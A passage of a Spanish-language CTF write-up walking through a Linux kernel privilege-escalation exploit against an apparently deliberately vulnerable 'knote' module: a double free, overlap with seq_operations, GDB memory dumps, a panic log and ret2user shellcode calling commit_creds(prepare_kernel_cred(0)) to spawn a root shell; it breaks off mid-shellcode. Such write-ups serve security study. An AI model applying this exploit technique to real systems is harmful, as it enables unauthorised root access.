+</code></pre></div><p>Ahora podemos obtener las direcciones relevantes:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">/home/user # grep -E 'prepare_kernel_cred|commit_creds' /proc/kallsyms  
+ffffffff81053a30 T commit_creds
+ffffffff81053c50 T prepare_kernel_cred
+ffffffff816cd674 r __ksymtab_commit_creds
+ffffffff816d110c r __ksymtab_prepare_kernel_cred
+ffffffff816d78b4 r __kstrtabns_commit_creds
+ffffffff816d78b4 r __kstrtabns_prepare_kernel_cred
+ffffffff816d8e22 r __kstrtab_commit_creds
+ffffffff816d8e62 r __kstrtab_prepare_kernel_cred
+</code></pre></div><p>Además, estas direcciones están relacionadas con el módulo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">/home/user # grep knote /proc/kallsyms
+ffffffffa0000040 t knote_ioctl  [knote]
+ffffffffa0002100 d knote_ioctl_lock     [knote]  
+ffffffffa0002000 d knote_fops   [knote]
+ffffffffa0002418 b major        [knote]
+ffffffffa0002410 b __key.26552  [knote]
+ffffffffa0002410 b knote_class  [knote]
+ffffffffa0001074 r _note_7      [knote]
+ffffffffa00023c0 b knotes       [knote]
+ffffffffa0002140 d __this_module        [knote]
+ffffffffa0000020 t knote_decrypt        [knote]
+ffffffffa0000000 t knote_encrypt        [knote]
+</code></pre></div><p>Ahora podemos cambiarlo de nuevo a no privilegiado.</p><h2 id="desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></h2><p>Usaremos estas funciones auxiliares:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">#define</span><span class="mtk1"> </span><span class="mtk8">KNOTE_CREATE</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">1337</span>
+<span class="mtk5">#define</span><span class="mtk1"> </span><span class="mtk8">KNOTE_DELETE</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">1338</span>
+
+<span class="mtk5">typedef</span><span class="mtk1"> </span><span class="mtk7 mtki">struct</span><span class="mtk1"> {</span>
+<span class="mtk1">        </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> idx;</span>
+<span class="mtk1">        </span><span class="mtk7 mtki">char</span><span class="mtk5">*</span><span class="mtk1"> data;</span>
+<span class="mtk1">        </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> len;</span>
+<span class="mtk1">} </span><span class="mtk7 mtki">req_t</span><span class="mtk1">;</span>
+
+<span class="mtk7 mtki">int</span><span class="mtk1"> fd;</span>
+
+<span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk9 mtki">idx</span><span class="mtk1">, </span><span class="mtk7 mtki">char</span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk9 mtki">data</span><span class="mtk1">, </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> </span><span class="mtk9 mtki">len</span><span class="mtk1">) {</span>
+<span class="mtk1">        </span><span class="mtk7 mtki">req_t</span><span class="mtk1"> req </span><span class="mtk5">=</span><span class="mtk1"> { .idx </span><span class="mtk5">=</span><span class="mtk1"> idx, .data </span><span class="mtk5">=</span><span class="mtk1"> data, .len </span><span class="mtk5">=</span><span class="mtk1"> len };</span>  
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">ioctl</span><span class="mtk1">(fd, KNOTE_CREATE, </span><span class="mtk5">&amp;</span><span class="mtk1">req);</span>
+<span class="mtk1">}</span>
+
+<span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk8">delete</span><span class="mtk1">(</span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk9 mtki">idx</span><span class="mtk1">) {</span>
+<span class="mtk1">        </span><span class="mtk7 mtki">req_t</span><span class="mtk1"> req </span><span class="mtk5">=</span><span class="mtk1"> { .idx </span><span class="mtk5">=</span><span class="mtk1"> idx };</span>
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">ioctl</span><span class="mtk1">(fd, KNOTE_DELETE, </span><span class="mtk5">&amp;</span><span class="mtk1">req);</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Para usar GDB, primero necesitamos extraer la imagen del kernel con una herramienta llamada <a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/extract-image.sh"><code>extract-image.sh</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">file</span> <span class="mtku">bzImage</span>
+bzImage: Linux kernel x86 boot executable bzImage, version 5.8.3 (raj@legion) #1 Fri Jul 16 02:24:20 IST 2021, RO-rootFS, swap_dev 0X1, Normal VGA  
+
+<span class="code-cyan">$</span> <span class="code-dark-green">bash</span> <span class="mtku">extract-image.sh</span> <span class="mtku">bzImage</span> &gt; vmlinux
+
+<span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">vmlinux</span>
+Reading symbols from <span class="code-dark-green">vmlinux</span>...
+(No debugging symbols found in <span class="code-dark-green">vmlinux</span>)
+<span class="code-red">gef➤  </span>gef-remote localhost 1234
+<span class="code-dark-blue">0xffffffff810177c5</span> in <span class="code-dark-yellow">??</span> ()
+<span class="code-red">[!]</span> Command 'gef-remote' failed to execute properly, reason: Remote I/O error: Function not implemented
+</code></pre></div><p>Comenzamos por abrir el dispositivo y creando una estructura <code>knote</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">open_device</span><span class="mtk1">() {</span>
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> ((fd </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk4">"/dev/knote"</span><span class="mtk1">, O_RDONLY)) </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>  
+<span class="mtk1">                </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"[-] Error opening device"</span><span class="mtk1">);</span>
+<span class="mtk1">                </span><span class="mtk8">exit</span>(<span class="mtk6">1</span><span class="mtk1">);</span>
+<span class="mtk1">        }</span>
+
+<span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
+<span class="mtk1">        </span><span class="mtk8">open_device</span>();
+
+<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"[*] Creating knote structure...</span><span class="mtk4 auto-closed-character">"</span><span class="mtk1 auto-closed-character">)</span>
+<span class="mtk1">        </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk4">"asdf"</span><span class="mtk1">, </span><span class="mtk6">4</span><span class="mtk1">);</span>
+
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Ejecutamos el <em>exploit</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">~ $ /solve
+[*] Creating knote structure...  
+</code></pre></div><p>Y en GDB podemos encontrar la estructura aquí:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>grep asdf
+<span class="code-blue">[+]</span> Searching '<span class="code-dark-yellow">asdf</span>' in memory
+<span class="code-green">[+]</span> In (0xffff88800009b000-0xffff888001000000), permission=rw-
+  0xffff8880003e004d - 0xffff8880003e0051  →   "<span class="code-dark-magenta">asdf</span>"
+<span class="code-green">[+]</span> In (0xffff8880018d2000-0xffff88800750a000), permission=rw-
+  0xffff8880074b6d98 - 0xffff8880074b6d9c  →   "<span class="code-dark-magenta">asdf[...]</span>"
+<span class="code-green">gef➤  </span>grep 0xffff8880074b6d98
+<span class="code-blue">[+]</span> Searching '<span class="code-dark-yellow">\x98\x6d\x4b\x07\x80\x88\xff\xff</span>' in memory
+<span class="code-green">[+]</span> In (0xffff888000000000-0xffff888000099000), permission=rw-
+  0xffff888000093c00 - 0xffff888000093c20  →   "<span class="code-dark-magenta">\x98\x6d\x4b\x07\x80\x88\xff\xff[...]</span>"  
+<span class="code-green">gef➤  </span>x/4gx 0xffff888000093c00
+<span class="code-dark-blue">0xffff888000093c00</span>:     0xffff8880074b6d98      0x0000000000000004
+<span class="code-dark-blue">0xffff888000093c10</span>:     0xffffffffa0000000      0xffffffffa0000020
+</code></pre></div><p>Así que ahí tenemos la estructura <code>knote</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">struct</span><span class="mtk1"> knote {</span>
+<span class="mtk1">    </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">data;</span>
+<span class="mtk1">    </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> len;</span>
+<span class="mtk1">    </span><span class="mtk7 mtki">void</span><span class="mtk1"> (</span><span class="mtk5">*</span><span class="mtk1">encrypt_func)(</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">, </span><span class="mtk7 mtki">size_t</span><span class="mtk1">);</span>  
+<span class="mtk1">    </span><span class="mtk7 mtki">void</span><span class="mtk1"> (</span><span class="mtk5">*</span><span class="mtk1">decrypt_func)(</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">, </span><span class="mtk7 mtki">size_t</span><span class="mtk1">);</span>
+<span class="mtk1">};</span>
+</code></pre></div><p>Ahora, ocasionamos el <em>bug</em> y la vulnerabilidad <em>double free</em>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">bug</span><span class="mtk1">() {</span>
+<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"[*] Triggering bug..."</span><span class="mtk1">);</span>
+
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, (</span><span class="mtk7 mtki">char</span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk5">0x</span><span class="mtk6">acdc1337</span><span class="mtk1">, </span><span class="mtk6">4</span><span class="mtk1">) </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">) {</span>  
+<span class="mtk1">                </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"[-] Failed"</span><span class="mtk1">);</span>
+<span class="mtk1">                </span><span class="mtk8">exit</span>(<span class="mtk6">1</span><span class="mtk1">);</span>
+<span class="mtk1">        }</span>
+
+<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"[*] Triggering double free..."</span><span class="mtk1">);</span>
+
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk8">delete</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
+<span class="mtk1">                </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"[-] Failed"</span><span class="mtk1">);</span>
+<span class="mtk1">                </span><span class="mtk8">exit</span>(<span class="mtk6">1</span><span class="mtk1">);</span>
+<span class="mtk1">        }</span>
+<span class="mtk1">}</span>
+
+<span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
+<span class="mtk1">        </span><span class="mtk8">open_device</span>();
+<span class="mtk1">        </span><span class="mtk8">bug</span>();
+
+<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"[*] Creating knote structure..."</span><span class="mtk1">);</span>
+<span class="mtk1">        </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk4">"asdf"</span><span class="mtk1">, </span><span class="mtk6">4</span><span class="mtk1">);</span>
+
+<span class="mtk1">        </span><span class="mtk8">getchar</span><span class="mtk1">();</span>
+
+<span class="mtk1">        </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk4">"fdsafdsafdsafdsa"</span><span class="mtk1">, </span><span class="mtk6">16</span><span class="mtk1">);</span>
+
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Con el código anterior, esperamos que <code>"fdsafdsafdsafdsa"</code> se almacene en la estructura actual (sobrescribiendo el puntero a <code>"asdf"</code>).</p><p>Esto es antes de <code>getchar()</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">~ $ /solve
+[*] Triggering bug...
+[*] Triggering double free...
+[*] Creating knote structure...  
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>grep asdf
+<span class="code-blue">[+]</span> Searching '<span class="code-dark-yellow">asdf</span>' in memory
+<span class="code-green">[+]</span> In (0x400000-0x405000), permission=r--
+  0x40308d - 0x403091  →   "<span class="code-dark-magenta">asdf</span>"
+  0x40408d - 0x404091  →   "<span class="code-dark-magenta">asdf</span>"
+<span class="code-green">[+]</span> In (0xffff88800009b000-0xffff888001000000), permission=rw-
+  0xffff8880003e008d - 0xffff8880003e0091  →   "<span class="code-dark-magenta">asdf</span>"
+<span class="code-green">[+]</span> In (0xffff8880018d2000-0xffff88800750b000), permission=rw-
+  0xffff8880074b6d98 - 0xffff8880074b6d9c  →   "<span class="code-dark-magenta">asdf[...]</span>"
+<span class="code-green">gef➤  </span>grep 0xffff8880074b6d98
+<span class="code-blue">[+]</span> Searching '<span class="code-dark-yellow">\x98\x6d\x4b\x07\x80\x88\xff\xff</span>' in memory
+<span class="code-green">[+]</span> In (0xffff888000000000-0xffff888000099000), permission=rw-
+  0xffff888000093c00 - 0xffff888000093c20  →   "<span class="code-dark-magenta">\x98\x6d\x4b\x07\x80\x88\xff\xff[...]</span>"  
+<span class="code-green">[+]</span> In (0xffff888007514000-0xffff888007fe0000), permission=rw-
+  0xffff888007f33040 - 0xffff888007f33060  →   "<span class="code-dark-magenta">\x98\x6d\x4b\x07\x80\x88\xff\xff[...]</span>"
+<span class="code-green">gef➤  </span>x/4gx 0xffff888000093c00
+<span class="code-dark-blue">0xffff888000093c00</span>:     0xffff8880074b6d98      0x0000000000000004
+<span class="code-dark-blue">0xffff888000093c10</span>:     0xffffffffa0000000      0xffffffffa0000020
+<span class="code-green">gef➤  </span>grep continue
+Continuing.
+</code></pre></div><p>Y después de <code>getchar()</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/4gx 0xffff888000093c00
+<span class="code-dark-blue">0xffff888000093c00</span>:     0xffff88800008c290      0x0000000000000010  
+<span class="code-dark-blue">0xffff888000093c10</span>:     0xffffffffa0000000      0xffffffffa0000020
+<span class="code-green">gef➤  </span>x/s 0xffff88800008c290
+<span class="code-dark-blue">0xffff88800008c290</span>:     "fdsafdsafdsafdsa.init.text"
+</code></pre></div><p>Entonces, hemos explotado la vulnerabilidad <em>double free</em>. Para verificarlo, podemos buscar el puntero a la estructura (debe almacenarse en la lista <code>knotes</code> dos veces):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>grep 0xffff888000093c00
+<span class="code-blue">[+]</span> Searching '<span class="code-dark-yellow">\x00\x3c\x09\x00\x80\x88\xff\xff</span>' in memory
+<span class="code-green">[+]</span> In (0xffff888007519000-0xffff888007fe0000), permission=rw-
+  0xffff8880075193c0 - 0xffff8880075193e0  →   "<span class="code-dark-magenta">\x00\x3c\x09\x00\x80\x88\xff\xff[...]</span>"  
+  0xffff8880075193c8 - 0xffff8880075193e8  →   "<span class="code-dark-magenta">\x00\x3c\x09\x00\x80\x88\xff\xff[...]</span>"
+<span class="code-green">[+]</span> In (0xffffffffa0002000-0xffffffffa0004000), permission=rw-
+  0xffffffffa00023c0 - 0xffffffffa00023e0  →   "<span class="code-dark-magenta">\x00\x3c\x09\x00\x80\x88\xff\xff[...]</span>"
+  0xffffffffa00023c8 - 0xffffffffa00023e8  →   "<span class="code-dark-magenta">\x00\x3c\x09\x00\x80\x88\xff\xff[...]</span>"
+<span class="code-green">gef➤  </span>x/10gx 0xffff8880075193c0
+<span class="code-dark-blue">0xffff8880075193c0</span>:     0xffff888000093c00      0xffff888000093c00
+<span class="code-dark-blue">0xffff8880075193d0</span>:     0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0xffff8880075193e0</span>:     0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0xffff8880075193f0</span>:     0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0xffff888007519400</span>:     0x0000000000000000      0x0000000000000000
+</code></pre></div><p>Y ahí la tenemos en los índices <code>0</code> y <code>1</code>.</p><p>Lo anterior fue solo una prueba de concepto. Ahora vamos a asignar una estructura <code>seq_operations</code> y a modificar sus punteros de la siguiente manera:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
+<span class="mtk1">        </span><span class="mtk8">open_device</span><span class="mtk1">();</span>
+<span class="mtk1">        </span><span class="mtk8">bug</span><span class="mtk1">();</span>
+
+<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"[*] Creating seq_operations structure..."</span><span class="mtk1">);</span>
+<span class="mtk1">        </span><span class="mtk7 mtki">int</span><span class="mtk1"> seq_fd </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk4">"/proc/self/stat"</span><span class="mtk1">, O_RDONLY);</span>
+
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (seq_fd </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
+<span class="mtk1">                </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"[-] Error opening /proc/self/stat"</span><span class="mtk1">);</span>  
+<span class="mtk1">                </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
+<span class="mtk1">        }</span>
+
+<span class="mtk1">        </span><span class="mtk8">getchar</span><span class="mtk1">();</span>
+
+<span class="mtk1">        </span><span class="mtk7 mtki">char</span><span class="mtk1"> data[</span><span class="mtk6">32</span><span class="mtk1">];</span>
+<span class="mtk1">        </span><span class="mtk8">memset</span><span class="mtk1">(data, </span><span class="mtk4">'A'</span><span class="mtk1">, </span><span class="mtk6">32</span><span class="mtk1">);</span>
+
+<span class="mtk1">        </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">, data, </span><span class="mtk6">32</span><span class="mtk1">);</span>
+
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Ejecutamos el <em>exploit</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">~ $ /solve
+[*] Triggering bug...
+[*] Triggering double free...
+[*] Creating seq_operations structure...  
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/4gx 0xffff888000093c00
+<span class="code-dark-blue">0xffff888000093c00</span>:     0xffffffff810f17e0      0xffffffff810f1800  
+<span class="code-dark-blue">0xffff888000093c10</span>:     0xffffffff810f17f0      0xffffffff811082e0
+</code></pre></div><p>Arriba podemos ver la estructura <code>seq_operations</code>, con los cuatro punteros. Si pasamos el <code>getchar()</code>, provocaremos un kernel <em>panic</em> porque hemos modificado esos punteros con valores <code>A</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">BUG: unable to handle page fault for address: ffffffff810f17f0
+#PF: supervisor write access in kernel mode
+#PF: error_code(0x0003) - permissions violation
+PGD 181d067 P4D 181d067 PUD 181e063 PMD 10001e1
+Oops: 0003 [#1] NOPTI
+CPU: 0 PID: 29 Comm: solve Tainted: G           O      5.8.3 #1
+RIP: 0010:knote_ioctl+0x11d/0xfc0 [knote]
+Code: 49 78 0c e1 4a 89 04 e5 c0 23 00 a0 48 85 db 0f 84 5a 01 00 00 48 8b 45 1  
+RSP: 0018:ffffc90000087ec0 EFLAGS: 00000286
+RAX: ffffffff810f17f0 RBX: ffff888000093c00 RCX: 000000000000058c
+RDX: 000000000000058b RSI: 0000000000000cc0 RDI: ffff888000090c00
+RBP: ffffc90000087ee8 R08: ffff888007f33080 R09: ffffffff810f17f0
+R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000001
+R13: 0000000000001337 R14: 00007fff73b05e80 R15: ffff88800013fa00
+FS:  0000000000405b98(0000) GS:ffffffff81832000(0000) knlGS:0000000000000000
+CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+CR2: ffffffff810f17f0 CR3: 0000000007546000 CR4: 00000000000006b0
+Call Trace:
+ ksys_ioctl+0x71/0xb0
+ __x64_sys_ioctl+0x19/0x20
+ do_syscall_64+0x40/0xb0
+ entry_SYSCALL_64_after_hwframe+0x44/0xa9
+RIP: 0033:0x4018b5
+Code: 00 48 89 44 24 18 31 c0 48 8d 44 24 60 c7 04 24 10 00 00 00 48 89 44 24 0
+RSP: 002b:00007fff73b05e00 EFLAGS: 00000246 ORIG_RAX: 0000000000000010
+RAX: ffffffffffffffda RBX: 00000000004012f1 RCX: 00000000004018b5
+RDX: 00007fff73b05e80 RSI: 0000000000001337 RDI: 0000000000000003
+RBP: 00007fff73b05ea0 R08: 0000000000000000 R09: 0000000000000000
+R10: 0000000000000000 R11: 0000000000000246 R12: 00007fff73b05f38
+R13: 00007fff73b05f48 R14: 0000000000000000 R15: 0000000000000000
+Modules linked in: knote(O)
+CR2: ffffffff810f17f0
+---[ end trace 6e2cce25cacf035e ]---
+RIP: 0010:knote_ioctl+0x11d/0xfc0 [knote]
+Code: 49 78 0c e1 4a 89 04 e5 c0 23 00 a0 48 85 db 0f 84 5a 01 00 00 48 8b 45 1
+RSP: 0018:ffffc90000087ec0 EFLAGS: 00000286
+RAX: ffffffff810f17f0 RBX: ffff888000093c00 RCX: 000000000000058c
+RDX: 000000000000058b RSI: 0000000000000cc0 RDI: ffff888000090c00
+RBP: ffffc90000087ee8 R08: ffff888007f33080 R09: ffffffff810f17f0
+R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000001
+R13: 0000000000001337 R14: 00007fff73b05e80 R15: ffff88800013fa00
+FS:  0000000000405b98(0000) GS:ffffffff81832000(0000) knlGS:0000000000000000
+CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+CR2: ffffffff810f17f0 CR3: 0000000007546000 CR4: 00000000000006b0
+Kernel panic - not syncing: Fatal exception
+Kernel Offset: disabled
+Rebooting in 1 seconds..
+</code></pre></div><p>En lugar de usar valores ficticios, usaremos la dirección de una función que usa <em>shellcode</em> para generar una <em>shell</em>. Esta configuración es necesaria para hacer una técnica ret2user (más información en <a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/">lkmidas.github.io</a>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">shell</span><span class="mtk1">() {</span>
+<span class="mtk1">        </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"[+] UID: </span><span class="mtk6">%d\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk8">getuid</span><span class="mtk1">());</span>
+<span class="mtk1">        </span><span class="mtk8">close</span><span class="mtk1">(seq_fd);</span>
+<span class="mtk1">        </span><span class="mtk8">system</span><span class="mtk1">(</span><span class="mtk4">"/bin/sh"</span><span class="mtk1">);</span>
+<span class="mtk1">        </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
+<span class="mtk1">}</span>
+
+<span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> bak_cs, bak_rflags, bak_ss, bak_rsp, bak_rip </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1">) shell;</span>  
+
+<span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">backup</span><span class="mtk1">() {</span>
+<span class="mtk1">        </span><span class="mtk7 mtki">__asm__</span><span class="mtk1">(</span>
+<span class="mtk1">                </span><span class="mtk4">"</span><span class="mtk1">.intel_syntax noprefix;</span><span class="mtk4">"</span>
+<span class="mtk1">                </span><span class="mtk4">"</span><span class="mtk1">mov bak_cs, cs;</span><span class="mtk4">"</span>
+<span class="mtk1">                </span><span class="mtk4">"</span><span class="mtk1">mov bak_ss, ss;</span><span class="mtk4">"</span>
+<span class="mtk1">                </span><span class="mtk4">"</span><span class="mtk1">mov bak_rsp, rsp;</span><span class="mtk4">"</span>
+<span class="mtk1">                </span><span class="mtk4">"</span><span class="mtk1">pushf;</span><span class="mtk4">"</span>
+<span class="mtk1">                </span><span class="mtk4">"</span><span class="mtk1">pop bak_rflags;</span><span class="mtk4">"</span>
+<span class="mtk1">                </span><span class="mtk4">"</span><span class="mtk1">.att_syntax;</span><span class="mtk4">"</span>
+<span class="mtk1">        );</span>
+
+<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"[+] Registers backed up"</span><span class="mtk1">);</span>
+<span class="mtk1">}</span>
+
+<span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">shellcode</span><span class="mtk1">() {</span>
+<span class="mtk1">        </span><span class="mtk7 mtki">__asm__</span><span class="mtk1">(</span>
+<span class="mtk1">                </span><span class="mtk4">"</span><span class="mtk1">.intel_syntax noprefix;</span><span class="mtk4">"</span>
+<span class="mtk1">                </span><span class="mtk4">"</span><span class="mtk1">mov rdi, 0;</span><span class="mtk4">"</span>
+<span class="mtk1">                </span><span class="mtk4">"</span><span class="mtk1">movabs rbx, 0xffffffff81053c50;</span><span class="mtk4">"</span><span class="mtk3">  // prepare_kernel_cred</span>
+<span class="mtk1">                </span><span class="mtk4">"</span><span class="mtk1">call rbx;</span><span class="mtk4">"</span>
+<span class="mtk1">                </span><span class="mtk4">"</span><span class="mtk1">mov rdi, rax;</span><span class="mtk4">"</span>
+<span class="mtk1">                </span><span class="mtk4">"</span><span class="mtk1">movabs rbx, 0xffffffff81053a30;</span><span class="mtk4">"</span><span class="mtk3">  // commit_creds</span>
+<span class="mtk1">                </span><span class="mtk4">"</span><span class="mtk1">call rbx;</span><span class="mtk4">"</span>
+<span class="mtk1">                </span><span class="mtk4">"</span><span class="mtk1">swapgs;</span><span class="mtk4">"</span>
+<span class="mtk1">                </span><span class="mtk4">"</span><span class="mtk1">mov r15, bak_ss;</span><span class="mtk4">"</span>
+<span class="mtk1">                </span><span class="mtk4">"</span><span class="mtk1">push r15;</span><span class="mtk4">"</span>
+<span class="mtk1">                </span><span class="mtk4">"</span><span class="mtk1">mov r15, bak_rsp;</span><span class="mtk4">"</span>
+<span class="mtk1">                </span><span class="mtk4">"</span><span class="mtk1">push r15;</span><span class="mtk4">"</span>
+<span class="mtk1">                </span><span class="mtk4">"</span><span class="mtk1">mov r15, bak_rflags;</span><span class="mtk4">"</span>
+<span class="mtk1">                </span><span class="mtk4">"</span><span class="mtk1">push r15;</span><span class="mtk4">"</span>
